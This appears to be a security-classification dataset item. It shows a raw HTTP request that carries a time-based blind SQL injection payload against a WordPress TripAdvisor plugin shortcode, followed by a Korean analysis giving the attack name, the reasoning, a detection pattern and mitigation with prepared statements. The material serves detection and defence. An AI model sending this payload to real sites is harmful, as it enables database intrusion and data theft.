POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 127.0.0.1
content-type: application/x-www-form-urlencoded

action=parse-media-shortcode&shortcode=[wptripadvisor_usetemplate+tid="1+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b)"]

- 공격 이름: `SQL Injection`
- 판단 근거: 페이로드에 `sleep(6)`과 같은 SQL 함수가 포함되어 있어 데이터베이스의 응답 지연을 유도합니다.
- 탐지 패턴: `select sleep(6)`
- 설명: `SQL Injection`은 공격자가 악의적인 SQL 코드를 주입하여 데이터베이스를 조작하거나 민감한 정보를 탈취하는 공격입니다.
- 대응 방법: 입력값에 대해 SQL 쿼리 실행 전에 철저한 검증과 필터링을 수행하고, 준비된 문(prepared statement)을 사용하여 SQL 주입을 방지합니다.
